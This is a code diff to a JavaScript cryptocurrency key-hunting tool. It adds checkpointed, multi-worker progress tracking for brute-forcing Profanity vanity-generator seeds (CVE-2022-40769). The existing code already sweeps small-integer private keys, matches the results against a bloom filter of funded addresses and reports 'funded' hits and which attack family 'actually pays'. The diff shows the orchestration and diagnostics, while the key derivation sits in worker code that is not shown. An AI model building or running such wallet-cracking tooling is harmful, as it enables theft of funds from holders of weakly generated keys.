@@ -2411,6 +2411,11 @@ let erc20TokensSweptCount = 0;
 let smallIntCursor = 0;
 let smallIntCheckedTotal = 0;
 const smallIntWorkerCursors = new Map();
+// Finite-family progress: Profanity vanity-generator seeds (CVE-2022-40769),
+// partitioned across hunter workers and persisted like the small-int sweep.
+let profanitySeedCursor = 0;
+let profanityCheckedTotal = 0;
+const profanityWorkerCursors = new Map();
 // Per-family lead/verdict stats — which vector family actually pays.
 const familyStats = {};
 function bumpFamily(vKey, field) {
@@ -2437,6 +2442,8 @@ function saveCheckpoint() {
       liveRpcRequestsSent,
       smallIntCursor,
       smallIntCheckedTotal,
+      profanitySeedCursor,
+      profanityCheckedTotal,
       brainGeneration: brainState.generation,
       brainEpochs: brainState.epochs
     };
@@ -2462,6 +2469,8 @@ for (const cpCandidate of [PERSISTENT_CHECKPOINT_FILE, CHECKPOINT_FILE]) {
       if (typeof cp.liveRpcRequestsSent === 'number') liveRpcRequestsSent = Math.max(liveRpcRequestsSent, cp.liveRpcRequestsSent);
       if (typeof cp.smallIntCursor === 'number') smallIntCursor = Math.max(smallIntCursor, cp.smallIntCursor);
       if (typeof cp.smallIntCheckedTotal === 'number') smallIntCheckedTotal = Math.max(smallIntCheckedTotal, cp.smallIntCheckedTotal);
+      if (typeof cp.profanitySeedCursor === 'number') profanitySeedCursor = Math.max(profanitySeedCursor, cp.profanitySeedCursor);
+      if (typeof cp.profanityCheckedTotal === 'number') profanityCheckedTotal = Math.max(profanityCheckedTotal, cp.profanityCheckedTotal);
     }
   } catch (_) {}
 }
@@ -2506,7 +2515,7 @@ function saveApiKeysConfig() {
    file instead of guesswork. Everything here is read-only telemetry: it never
    invents a balance, never promotes a lead and never touches a vault.
    ──────────────────────────────────────────────────────────────────────── */
-const APP_VERSION = '2.9.0-beta.6';
+const APP_VERSION = '2.9.0-beta.7';
 const DIAG_LOG_FILE = path.join(PERSISTENT_STATE_DIR, 'diagnostics.log');
 const DIAG_REPORT_FILE = path.join(PERSISTENT_STATE_DIR, 'DIAGNOSTIC_REPORT.txt');
 const DIAG_BOOT_AT = Date.now();
@@ -2930,6 +2939,8 @@ function diagSnapshot() {
       falsePositiveRate: Number(fundedBloomMeta.falsePositiveRate || 0),
       smallIntNext: smallIntCursor,
       smallIntChecked: smallIntCheckedTotal,
+      profanityNext: profanitySeedCursor,
+      profanityChecked: profanityCheckedTotal,
       families: familyStats
     },
     chains,
@@ -3071,6 +3082,7 @@ function diagnosticsReportText(snapshot) {
   L.push(`  verdicts             ${s.funnel.verdicts.toLocaleString()} checked · ${s.funnel.confirmedEmpty.toLocaleString()} empty · ${s.funnel.unanswered.toLocaleString()} unanswered`);
   L.push(`  confirmed            ${s.funnel.confirmedFunded.toLocaleString()} funded · ${s.funnel.confirmedEverHeld.toLocaleString()} ever-held`);
   L.push(`  small-int sweep      through key ${s.funnel.smallIntNext.toLocaleString()} · ${s.funnel.smallIntChecked.toLocaleString()} keys checked (finite family)`);
+  L.push(`  profanity sweep      through seed ${(s.funnel.profanityNext || 0).toLocaleString()} · ${(s.funnel.profanityChecked || 0).toLocaleString()} keys checked (finite family · CVE-2022-40769)`);
   const famRows = Object.entries(s.funnel.families || {}).sort((a, b) => (b[1].leads || 0) - (a[1].leads || 0));
   if (famRows.length) {
     L.push('  by family            leads / empty / funded / ever-held');
@@ -4056,6 +4068,7 @@ function spawnHunterWorker(wId) {
       sharedFundedBloomBuffer,
       workerCount: WORKER_THREAD_COUNT,
       smallIntCursor,
+      profanityCursor: profanitySeedCursor,
       initialTargets: Array.from(targetAddressMap.keys())
     }
   });
@@ -4082,6 +4095,17 @@ function spawnHunterWorker(wId) {
         let minFrontier = Infinity;
         for (const v of smallIntWorkerCursors.values()) if (v < minFrontier) minFrontier = v;
         if (minFrontier !== Infinity) smallIntCursor = Math.max(smallIntCursor, minFrontier - WORKER_THREAD_COUNT);
+      }
+      if (msg.profanitySeedNext != null) {
+        const pfNext = Math.max(0, Number(msg.profanitySeedNext || 0));
+        const pfChecked = Math.max(0, Number(msg.profanityChecked || 0));
+        profanityWorkerCursors.set((msg.workerId != null ? msg.workerId : wId), pfNext);
+        if (pfChecked > 0) profanityCheckedTotal += pfChecked;
+        if (profanityWorkerCursors.size) {
+          let pfMin = Infinity;
+          for (const v of profanityWorkerCursors.values()) if (v < pfMin) pfMin = v;
+          if (pfMin !== Infinity) profanitySeedCursor = Math.max(profanitySeedCursor, pfMin - WORKER_THREAD_COUNT);
+        }
       }
 
       for (const hit of burstHitsArr) {
